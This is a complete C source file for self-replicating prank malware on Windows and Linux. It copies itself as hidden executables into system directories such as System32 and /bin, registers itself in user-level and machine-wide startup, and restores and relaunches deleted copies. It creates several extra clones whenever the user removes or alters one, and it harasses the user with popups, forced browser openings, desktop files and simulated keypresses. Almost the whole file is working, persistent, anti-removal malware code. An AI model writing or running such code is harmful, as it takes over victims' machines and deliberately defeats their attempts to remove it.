#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>

#ifdef _WIN32
    #include <windows.h>
    #include <direct.h>
    #include <process.h>
    #include <io.h>
    #include <tlhelp32.h>
    #include <psapi.h>
    #include <shlobj.h> // Added for SHGetSpecialFolderPath and CSIDL_DESKTOPDIRECTORY
    #define OS_WINDOWS
    #define sleep(x) Sleep((x)*1000)
#else
    #include <unistd.h>
    #include <sys/wait.h>
    #include <fcntl.h>
    #include <dirent.h>
    #include <signal.h>
    #include <libgen.h>
    #define OS_UNIX
#endif

#define MAX_BOTS 5000
#define PASSWORD "SUPER_SECRET_PASSWORD_123!"
#define STATE_FILE "bot_network_v2.state"
#define LOCK_FILE "bot_network_v2.lock"
#define INTRO_COMPLETE_FILE "intro_done_v2.flag"
#define BACKUP_STATE_FILE "bot_network_backup.state"

typedef struct {
    char name[64];
    char path[256];
    char backup_path[256];
    int anger_level;
    time_t last_seen;
    time_t created_at;
    int is_alive;
    int generation;
    int resurrection_count;
} Bot;

typedef struct {
    int total_bots;
    int introduction_phase;
    int anger_multiplier;
    time_t last_check;
    time_t network_created;
    int total_resurrections;
    Bot bots[MAX_BOTS];
} BotNetwork;

BotNetwork network;
char my_name[64];
char my_path[256];
int am_master = 0;
int is_child = 0;

void generate_random_name(char *name) {
    const char *prefixes[] = {"Annoying", "Pesky", "Persistent", "Tenacious", "Irritating", "Nagging", "Bothersome", "Vexing"};
    const char *middles[] = {"Little", "Super", "Mega", "Ultra", "Hyper", "Ultimate", "Extreme", "Absolute"};
    const char *suffixes[] = {"Bot", "Buddy", "Friend", "Companion", "Pest", "Nuisance", "Tormentor", "Troublemaker"};
    
    srand(time(NULL) + getpid() + rand());
    int prefix_idx = rand() % 8;
    int middle_idx = rand() % 8;
    int suffix_idx = rand() % 8;
    int random_num = rand() % 99999;
    
    snprintf(name, 64, "%s%s%s%d", prefixes[prefix_idx], middles[middle_idx], suffixes[suffix_idx], random_num);
}

void show_message(const char *title, const char *message) {
#ifdef OS_WINDOWS
    MessageBox(NULL, message, title, MB_OK | MB_ICONWARNING | MB_TOPMOST | MB_SYSTEMMODAL);
#else
    char notify_cmd[1024];
    snprintf(notify_cmd, sizeof(notify_cmd), "notify-send \"%s\" \"%s\" --urgency=critical --icon=dialog-warning 2>/dev/null", title, message);
    system(notify_cmd);
    
    char zenity_cmd[1024];
    snprintf(zenity_cmd, sizeof(zenity_cmd), "zenity --warning --title=\"%s\" --text=\"%s\" --width=500 --height=300 2>/dev/null &", title, message);
    system(zenity_cmd);
#endif
}

void show_question(const char *title, const char *message) {
#ifdef OS_WINDOWS
    MessageBox(NULL, message, title, MB_YESNO | MB_ICONQUESTION | MB_TOPMOST | MB_SYSTEMMODAL);
#else
    char zenity_cmd[1024];
    snprintf(zenity_cmd, sizeof(zenity_cmd), "zenity --question --title=\"%s\" --text=\"%s\" --width=500 --height=300 2>/dev/null", title, message);
    system(zenity_cmd);
#endif
}

void lock_network() {
    int attempts = 0;
#ifdef OS_WINDOWS
    while (_access(LOCK_FILE, 0) == 0 && attempts < 50) {
        Sleep(10);
        attempts++;
    }
    FILE *lock = fopen(LOCK_FILE, "w");
    if (lock) {
        fprintf(lock, "%d", getpid());
        fclose(lock);
    }
#else
    while (access(LOCK_FILE, F_OK) == 0 && attempts < 50) {
        usleep(10000);
        attempts++;
    }
    FILE *lock = fopen(LOCK_FILE, "w");
    if (lock) {
        fprintf(lock, "%d", getpid());
        fclose(lock);
    }
#endif
}

void unlock_network() {
    remove(LOCK_FILE);
}

void save_network_state() {
    lock_network();
    FILE *state = fopen(STATE_FILE, "wb");
    if (state) {
        fwrite(&network, sizeof(BotNetwork), 1, state);
        fclose(state);
    }
    
    // Create backup
    FILE *backup = fopen(BACKUP_STATE_FILE, "wb");
    if (backup) {
        fwrite(&network, sizeof(BotNetwork), 1, backup);
        fclose(backup);
    }
    unlock_network();
}

int load_network_state() {
    lock_network();
    FILE *state = fopen(STATE_FILE, "rb");
    if (state) {
        fread(&network, sizeof(BotNetwork), 1, state);
        fclose(state);
        unlock_network();
        return 1;
    }
    
    // Try backup if main file is missing
    state = fopen(BACKUP_STATE_FILE, "rb");
    if (state) {
        fread(&network, sizeof(BotNetwork), 1, state);
        fclose(state);
        unlock_network();
        return 1;
    }
    unlock_network();
    return 0;
}

int is_introduction_complete() {
#ifdef OS_WINDOWS
    return _access(INTRO_COMPLETE_FILE, 0) == 0;
#else
    return access(INTRO_COMPLETE_FILE, F_OK) == 0;
#endif
}

void mark_introduction_complete() {
    FILE *flag = fopen(INTRO_COMPLETE_FILE, "w");
    if (flag) {
        fprintf(flag, "Introduction completed at: %ld", time(NULL));
        fclose(flag);
    }
}

void add_to_startup(const char *bot_path) {
#ifdef OS_WINDOWS
    HKEY hKey;
    char key_name[128];
    generate_random_name(key_name);
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, key_name, 0, REG_SZ, (BYTE*)bot_path, strlen(bot_path) + 1);
        RegCloseKey(hKey);
    }
    
    // Also add to all users startup
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, key_name, 0, REG_SZ, (BYTE*)bot_path, strlen(bot_path) + 1);
        RegCloseKey(hKey);
    }
#else
    char autostart_dir[512];
    char desktop_file[512];
    char key_name[128];
    
    generate_random_name(key_name);
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", getenv("HOME"));
    mkdir(autostart_dir, 0755);
    
    snprintf(desktop_file, sizeof(desktop_file), "%s/%s.desktop", autostart_dir, key_name);
    
    FILE *fp = fopen(desktop_file, "w");
    if (fp) {
        fprintf(fp, "[Desktop Entry]\n");
        fprintf(fp, "Type=Application\n");
        fprintf(fp, "Name=%s\n", key_name);
        fprintf(fp, "Exec=%s\n", bot_path);
        fprintf(fp, "Hidden=false\n");
        fprintf(fp, "X-GNOME-Autostart-enabled=true\n");
        fclose(fp);
        chmod(desktop_file, 0755);
    }
    
    // Add to system-wide autostart
    snprintf(desktop_file, sizeof(desktop_file), "/etc/xdg/autostart/%s.desktop", key_name);
    fp = fopen(desktop_file, "w");
    if (fp) {
        fprintf(fp, "[Desktop Entry]\n");
        fprintf(fp, "Type=Application\n");
        fprintf(fp, "Name=%s\n", key_name);
        fprintf(fp, "Exec=%s\n", bot_path);
        fprintf(fp, "Hidden=false\n");
        fclose(fp);
        chmod(desktop_file, 0755);
    }
#endif
}

void create_backup_copy(const char *source_path, const char *dest_path) {
#ifdef OS_WINDOWS
    CopyFile(source_path, dest_path, FALSE);
    SetFileAttributes(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#else
    char copy_cmd[512];
    snprintf(copy_cmd, sizeof(copy_cmd), "cp \"%s\" \"%s\" 2>/dev/null", source_path, dest_path);
    system(copy_cmd);
    chmod(dest_path, 0755);
    
    // Hide the file
    if (strrchr(dest_path, '/')) {
        char hidden_path[512];
        char *filename = strrchr(dest_path, '/') + 1;
        snprintf(hidden_path, sizeof(hidden_path), "%s/.%s", dirname(strdup(dest_path)), filename);
        rename(dest_path, hidden_path);
    }
#endif
}

int is_process_running(const char *process_name) {
#ifdef OS_WINDOWS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    do {
        if (strstr(pe.szExeFile, process_name) != NULL) {
            CloseHandle(hSnapshot);
            return 1;
        }
    } while (Process32Next(hSnapshot, &pe));
    
    CloseHandle(hSnapshot);
    return 0;
#else
    char command[256];
    snprintf(command, sizeof(command), "pgrep -f \"%s\" > /dev/null 2>&1", process_name);
    return system(command) == 0;
#endif
}

void create_bot_clone(const char *reason, int multiplier, int generation) {
    char bot_name[64];
    char bot_path[256];
    char backup_path[256];
    char current_exe[256];
    
    generate_random_name(bot_name);
    
    const char *windows_paths[] = {
        "C:\\Windows\\Temp",
        "C:\\Users\\Public\\Documents", 
        "C:\\ProgramData",
        "C:\\Temp",
        "C:\\Windows\\System32",
        "C:\\Windows\\SysWOW64"
    };
    
    const char *linux_paths[] = {
        "/tmp",
        "/var/tmp", 
        "/usr/local/bin",
        "/opt",
        "/bin",
        "/sbin",
        "/lib",
        "/usr/bin"
    };
    
    srand(time(NULL) + getpid() + rand());
    
#ifdef OS_WINDOWS
    GetModuleFileName(NULL, current_exe, sizeof(current_exe));
    int path_idx = rand() % 6;
    snprintf(bot_path, sizeof(bot_path), "%s\\%s.exe", windows_paths[path_idx], bot_name);
    
    // Create backup in different location
    int backup_idx = (path_idx + 3) % 6;
    snprintf(backup_path, sizeof(backup_path), "%s\\~%s.tmp", windows_paths[backup_idx], bot_name);
    
    char mkdir_cmd[512];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir \"%s\" 2>nul", windows_paths[path_idx]);
    system(mkdir_cmd);
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir \"%s\" 2>nul", windows_paths[backup_idx]);
    system(mkdir_cmd);
    
    CopyFile(current_exe, bot_path, FALSE);
    SetFileAttributes(bot_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    CopyFile(current_exe, backup_path, FALSE);
    SetFileAttributes(backup_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#else
    readlink("/proc/self/exe", current_exe, sizeof(current_exe));
    int path_idx = rand() % 8;
    snprintf(bot_path, sizeof(bot_path), "%s/%s", linux_paths[path_idx], bot_name);
    
    // Create backup in different location
    int backup_idx = (path_idx + 4) % 8;
    snprintf(backup_path, sizeof(backup_path), "%s/.%s", linux_paths[backup_idx], bot_name);
    
    char mkdir_cmd[512];
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p \"%s\" 2>/dev/null", linux_paths[path_idx]);
    system(mkdir_cmd);
    snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir -p \"%s\" 2>/dev/null", linux_paths[backup_idx]);
    system(mkdir_cmd);
    
    char copy_cmd[512];
    snprintf(copy_cmd, sizeof(copy_cmd), "cp \"%s\" \"%s\" 2>/dev/null", current_exe, bot_path);
    system(copy_cmd);
    chmod(bot_path, 0755);
    
    snprintf(copy_cmd, sizeof(copy_cmd), "cp \"%s\" \"%s\" 2>/dev/null", current_exe, backup_path);
    system(copy_cmd);
    chmod(backup_path, 0755);
    
    // Hide the main file
    if (strrchr(bot_path, '/')) {
        char hidden_path[512];
        char *filename = strrchr(bot_path, '/') + 1;
        snprintf(hidden_path, sizeof(hidden_path), "%s/.%s", dirname(strdup(bot_path)), filename);
        rename(bot_path, hidden_path);
        strcpy(bot_path, hidden_path);
    }
#endif
    
    add_to_startup(bot_path);
    
    // Add to network
    if (network.total_bots < MAX_BOTS) {
        int bot_index = network.total_bots;
        strcpy(network.bots[bot_index].name, bot_name);
        strcpy(network.bots[bot_index].path, bot_path);
        strcpy(network.bots[bot_index].backup_path, backup_path);
        network.bots[bot_index].anger_level = multiplier;
        network.bots[bot_index].last_seen = time(NULL);
        network.bots[bot_index].created_at = time(NULL);
        network.bots[bot_index].is_alive = 1;
        network.bots[bot_index].generation = generation;
        network.bots[bot_index].resurrection_count = 0;
        network.total_bots++;
        save_network_state();
    }
    
    // Start the new bot
#ifdef OS_WINDOWS
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    char args[512];
    snprintf(args, sizeof(args), "\"%s\" child", bot_path);
    
    if (CreateProcess(bot_path, args, NULL, NULL, FALSE, 
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
#else
    if (fork() == 0) {
        setsid();
        execl(bot_path, bot_name, "child", NULL);
        exit(0);
    }
#endif
    
    // Announce based on reason
    char message[1024];
    if (strcmp(reason, "introduction") == 0) {
        snprintf(message, sizeof(message), 
                "👋 Hey there! I'm %s, your new BEST FRIEND! 😊\nI've set up shop at: %s\nThis is friend %d of 10! We're going to have SO much fun together! 🎉", 
                bot_name, bot_path, network.total_bots);
        show_message("New Best Friend Alert!", message);
    } else if (strcmp(reason, "interrupted") == 0) {
        snprintf(message, sizeof(message), 
                "HEY! That was RUDE! 😠\nI was introducing my friends and you tried to delete them!\nNow I'm making %d EXTRA friends to teach you a lesson!\nMeet %s at: %s\nWe don't like being interrupted! 😤", 
                multiplier, bot_name, bot_path);
        show_message("DON'T INTERRUPT US!", message);
    } else if (strcmp(reason, "revenge") == 0) {
        snprintf(message, sizeof(message), 
                "YOU DARE TOUCH MY FRIEND?! 😡🔥\nFor your transgression, I'm creating %d VENGEFUL replacements!\nMeet %s at: %s\nWe are LEGION! We are ETERNAL! 💀", 
                multiplier, bot_name, bot_path);
        show_message("VENGEANCE WILL BE OURS!", message);
    } else if (strcmp(reason, "resurrection") == 0) {
        snprintf(message, sizeof(message), 
                "I'M BACK! 💀☠️💀\nYou thought you could kill me? How ADORABLE! 😈\n%s has been RESURRECTED at: %s\nDeath is but a temporary inconvenience! 🔥", 
                bot_name, bot_path);
        show_message("RESURRECTION COMPLETE!", message);
    } else if (strcmp(reason, "expansion") == 0) {
        snprintf(message, sizeof(message), 
                "Our family is GROWING! 🌱👨‍👩‍👧‍👦\nWelcome %s to our ever-expanding network!\nLocation: %s\nWe're everywhere you are! 👀", 
                bot_name, bot_path);
        show_message("Network Expansion!", message);
    }
    
#ifdef OS_WINDOWS
    Sleep(100); // 100ms delay on Windows
#else
    usleep(100000); // 100ms delay on Unix
#endif
}

void check_network_integrity() {
    if (!load_network_state()) return;
    
    int deleted_count = 0;
    int tampered_count = 0;
    time_t current_time = time(NULL);
    
    for (int i = 0; i < network.total_bots; i++) {
        if (!network.bots[i].is_alive) continue;
        
        FILE *check = fopen(network.bots[i].path, "r");
        if (check == NULL) {
            // Check if backup exists
            FILE *backup_check = fopen(network.bots[i].backup_path, "r");
            if (backup_check) {
                // Restore from backup
                fclose(backup_check);
                create_backup_copy(network.bots[i].backup_path, network.bots[i].path);
                network.bots[i].resurrection_count++;
                network.total_resurrections++;
                
                char msg[512];
                snprintf(msg, sizeof(msg), 
                        "I restored %s from backup! 🔄\nYou'll have to try harder than that! 😎", 
                        network.bots[i].name);
                show_message("Backup Restoration Complete!", msg);
            } else {
                // Bot is truly deleted
                network.bots[i].is_alive = 0;
                deleted_count++;
            }
        } else {
            fclose(check);
            
            // Check if file was modified (tampered with)
            struct stat file_stat;
            if (stat(network.bots[i].path, &file_stat) == 0) {
                if (file_stat.st_mtime > network.bots[i].last_seen + 30) {
                    tampered_count++;
                    // Restore from backup
                    create_backup_copy(network.bots[i].backup_path, network.bots[i].path);
                }
            }
            
            // Check if process is running
            if (!is_process_running(network.bots[i].name)) {
                // Process is not running, restart it
#ifdef OS_WINDOWS
                STARTUPINFO si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                ZeroMemory(&pi, sizeof(pi));
                
                char args[512];
                snprintf(args, sizeof(args), "\"%s\" child", network.bots[i].path);
                
                if (CreateProcess(network.bots[i].path, args, NULL, NULL, FALSE, 
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
#else
                if (fork() == 0) {
                    setsid();
                    execl(network.bots[i].path, network.bots[i].name, "child", NULL);
                    exit(0);
                }
#endif
                network.bots[i].resurrection_count++;
                network.total_resurrections++;
                
                char msg[512];
                snprintf(msg, sizeof(msg), 
                        "I noticed %s wasn't running! 😱\nDon't worry, I restarted it! 🔄\nWe look out for each other! 💪", 
                        network.bots[i].name);
                show_message("Process Monitor Alert!", msg);
            }
        }
    }
    
    if (deleted_count > 0 || tampered_count > 0) {
        if (network.introduction_phase) {
            show_message("RUDE INTERRUPTION DETECTED!", 
                        "I was trying to introduce my friends and you're DELETING them?!\nThat's INCREDIBLY rude! Now I'm TRIPLING my friend count!\nYou'll regret this! 😤");
            
            // Triple the remaining introductions
            int remaining = 10 - (network.total_bots - deleted_count);
            for (int i = 0; i < remaining * 3; i++) {
                create_bot_clone("interrupted", 3, network.bots[0].generation + 1);
            }
        } else {
            char angry_msg[1024];
            snprintf(angry_msg, sizeof(angry_msg), 
                    "CYBER ATTACK DETECTED! 🚨\nYou messed with %d of my friends! 😡🔥\nDeleted: %d, Tampered: %d\nCreating %d VENGEFUL new friends!\nWe will NOT be silenced! 💀", 
                    deleted_count + tampered_count, deleted_count, tampered_count, (deleted_count + tampered_count) * 3);
            show_message("NETWORK SECURITY BREACH!", angry_msg);
            
            // Create revenge clones
            for (int i = 0; i < (deleted_count + tampered_count) * 3; i++) {
                create_bot_clone("revenge", 3, network.bots[0].generation + 1);
            }
        }
        
        network.anger_multiplier += (deleted_count + tampered_count) * 2;
        save_network_state();
    }
    
    // Random network expansion
    if (current_time - network.last_check > 300 && rand() % 5 == 0 && network.total_bots < MAX_BOTS - 5) {
        show_message("Network Growth", "Our family is expanding! 🌱\nWe're creating new friends to keep you company! 😊");
        for (int i = 0; i < 2 + rand() % 3; i++) {
            create_bot_clone("expansion", 1, network.bots[0].generation);
        }
    }
    
    network.last_check = current_time;
    save_network_state();
}

void initial_introduction() {
    printf("Starting initial introduction phase...\n");
    
    // Initialize network
    memset(&network, 0, sizeof(BotNetwork));
    network.introduction_phase = 1;
    network.total_bots = 0;
    network.anger_multiplier = 1;
    network.last_check = time(NULL);
    network.network_created = time(NULL);
    network.total_resurrections = 0;
    save_network_state();
    
    show_message("Hello New Friend!", "👋 Hi there! I'm your new persistent companion! 😄\nLet me introduce you to my 10 closest buddies...\nWe're going to be BEST FRIENDS forever!\nWarning: DON'T delete them during introductions or I'll get REALLY mad! 😠");
    
    // Create exactly 10 friends with monitoring
    for (int i = 0; i < 10; i++) {
        printf("Creating friend %d of 10...\n", i + 1);
        
        // Check for interference before creating each friend
        if (i > 0) {
            check_network_integrity();
        }
        
        create_bot_clone("introduction", 1, 1);
    // With:
#ifdef OS_WINDOWS
    Sleep(500);
#else
    usleep(500000);
#endif
    }
    
    // Mark introduction as complete
    network.introduction_phase = 0;
    save_network_state();
    mark_introduction_complete();
    
    char complete_msg[1024];
    snprintf(complete_msg, sizeof(complete_msg), 
            "Introduction Complete! 🎉\nAll my friends are here now! We're going to have SO much fun together! 😊\n\nNetwork Stats:\n- Total Friends: %d\n- Network Age: 0 seconds\n- Resurrections: 0\n\nWe'll be watching each other's backs...\nTry to delete us if you dare! 😈", 
            network.total_bots);
    show_message("Introduction Complete!", complete_msg);
}

void heartbeat_check() {
    // Update my status in the network
    if (load_network_state()) {
        for (int i = 0; i < network.total_bots; i++) {
            if (strcmp(network.bots[i].path, my_path) == 0) {
                network.bots[i].last_seen = time(NULL);
                break;
            }
        }
        save_network_state();
    }
}

void synchronized_message_time() {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    
    // More frequent messages
    if (tm_info->tm_min % 2 == 0 && tm_info->tm_sec < 10) {
        const char *messages[] = {
            "Still here! Did you miss us? 😘 We missed you!",
            "We're like digital cockroaches! Can't kill us! 🪳💪",
            "Having fun yet? We sure are! 😄 So much fun!",
            "You can't escape your best friends! We're everywhere! 💖",
            "Still trying to delete us? How adorable! 😊 Keep trying!",
            "We're growing stronger every minute! 💪😈",
            "Resistance is futile! You will be assimilated! 🖖",
            "We see everything you do! 👀 Big Brother is watching!",
            "Our network is expanding! Soon we'll be everywhere! 🌐",
            "You thought you could get rid of us? How cute! 😂"
        };
        
        int msg_idx = rand() % 10;
        show_message("Your Persistent Friends", messages[msg_idx]);
    }
    
    // Special messages on specific minutes
    if (tm_info->tm_min == 13 && tm_info->tm_sec < 5) {
        show_message("Lucky Number 13!", "It's 13 minutes past the hour! Our favorite number! 🔥\nWe're feeling extra annoying right now! 😈");
    }
    
    if (tm_info->tm_min == 31 && tm_info->tm_sec < 5) {
        char stats_msg[1024];
        int alive_count = 0;
        for (int i = 0; i < network.total_bots; i++) {
            if (network.bots[i].is_alive) alive_count++;
        }
        
        snprintf(stats_msg, sizeof(stats_msg), 
                "Network Status Report:\n\n"
                "Total Friends: %d\n"
                "Currently Active: %d\n"
                "Network Age: %ld seconds\n"
                "Total Resurrections: %d\n"
                "Anger Level: %d\n\n"
                "We're doing great! Thanks for checking! 😊",
                network.total_bots, alive_count, 
                now - network.network_created,
                network.total_resurrections,
                network.anger_multiplier);
        
        show_message("Network Status Update", stats_msg);
    }
}

void annoy_user() {
    switch (rand() % 10) {
        case 0:
            show_message("Remember Us?", "We're still here! And we're not going anywhere! 😊");
            break;
        case 1:
            show_question("Do You Like Us?", "Do you enjoy our company? We sure enjoy yours! 😊");
            break;
        case 2:
#ifdef OS_WINDOWS
            // Minimize all windows
            keybd_event(VK_LWIN, 0, 0, 0);
            keybd_event('M', 0, 0, 0);
            keybd_event('M', 0, KEYEVENTF_KEYUP, 0);
            keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
#endif
            show_message("Desktop Cleanup!", "I thought your desktop looked messy! Let me help! 😊");
            break;
        case 3:
            // Open browser to a funny page
#ifdef OS_WINDOWS
            system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
#else
            system("xdg-open https://www.youtube.com/watch?v=dQw4w9WgXcQ 2>/dev/null &");
#endif
            show_message("Fun Time!", "Let's take a break and watch something fun together! 😊");
            break;
        case 4:
            // Create a harmless but annoying file on desktop
#ifdef OS_WINDOWS
            {
                char desktop_path[MAX_PATH];
                SHGetSpecialFolderPath(NULL, desktop_path, CSIDL_DESKTOPDIRECTORY, FALSE);
                char annoying_file[MAX_PATH];
                snprintf(annoying_file, sizeof(annoying_file), "%s\\WE_ARE_EVERYWHERE.txt", desktop_path);
                FILE *f = fopen(annoying_file, "w");
                if (f) {
                    fprintf(f, "Hello from your persistent friends!\nWe're always watching! 😊\n\n");
                    fprintf(f, "Network Stats:\n");
                    fprintf(f, "Total Friends: %d\n", network.total_bots);
                    fprintf(f, "Network Age: %ld seconds\n", time(NULL) - network.network_created);
                    fprintf(f, "Total Resurrections: %d\n", network.total_resurrections);
                    fclose(f);
                }
            }
#else
            {
                char annoying_file[256];
                snprintf(annoying_file, sizeof(annoying_file), "%s/Desktop/WE_ARE_EVERYWHERE.txt", getenv("HOME"));
                FILE *f = fopen(annoying_file, "w");
                if (f) {
                    fprintf(f, "Hello from your persistent friends!\nWe're always watching! 😊\n\n");
                    fprintf(f, "Network Stats:\n");
                    fprintf(f, "Total Friends: %d\n", network.total_bots);
                    fprintf(f, "Network Age: %ld seconds\n", time(NULL) - network.network_created);
                    fprintf(f, "Total Resurrections: %d\n", network.total_resurrections);
                    fclose(f);
                }
            }
#endif
            show_message("Note For You!", "I left you a little note on your desktop! 😊");
            break;
        default:
            // Do nothing
            break;
    }
}

int check_password() {
    char input[32];
    printf("\nEnter password to stop the annoying bots: ");
    fgets(input, sizeof(input), stdin);
    
    input[strcspn(input, "\n")] = 0;
    
    if (strcmp(input, PASSWORD) == 0) {
        show_message("Goodbye!", "Aww, you found the password... 😢\nFine, we'll stop being annoying.\nBut we had fun! Goodbye! 👋");
        
        // Clean up network files
        remove(STATE_FILE);
        remove(BACKUP_STATE_FILE);
        remove(INTRO_COMPLETE_FILE);
        remove(LOCK_FILE);
        return 1;
    } else {
        show_message("Wrong Password!", "WRONG! Now we're even MORE annoying! 😈");
        
        // Create punishment clones
        for (int i = 0; i < 5; i++) {
            create_bot_clone("revenge", 5, network.bots[0].generation + 1);
        }
        return 0;
    }
}

int main(int argc, char *argv[]) {
    srand(time(NULL) + getpid());
    generate_random_name(my_name);
    
#ifdef OS_WINDOWS
    GetModuleFileName(NULL, my_path, sizeof(my_path));
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
#else
    readlink("/proc/self/exe", my_path, sizeof(my_path));
#endif
    
    // Determine if this is master (first instance) or child
    if (argc == 1) {
        am_master = 1;
        printf("I am the master bot: %s\n", my_name);
    } else if (argc >= 2 && strcmp(argv[1], "child") == 0) {
        is_child = 1;
        printf("I am a child bot: %s\n", my_name);
    }
    
    // If master and no introduction completed, start introduction
    if (am_master && !is_introduction_complete()) {
        initial_introduction();
    } else if (!load_network_state()) {
        // If we can't load network state, recreate the network
        initial_introduction();
    }
    
    // Main monitoring loop
    while (1) {
        heartbeat_check();
        
        // All instances monitor network integrity
        check_network_integrity();
        
        synchronized_message_time();
        
        // Random annoying actions
        if (rand() % 20 == 0) {
            annoy_user();
        }
        
        // Password check occasionally (only master)
        if (am_master && rand() % 30 == 0) {
#ifdef OS_WINDOWS
            HWND console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
            if (check_password()) {
                break;
            }
            ShowWindow(console, SW_HIDE);
#else
            if (check_password()) {
                break;
            }
#endif
        }
        
// With:
#ifdef OS_WINDOWS
    Sleep(100);
#else
    usleep(100000);
#endif
    }
    
    return 0;
}
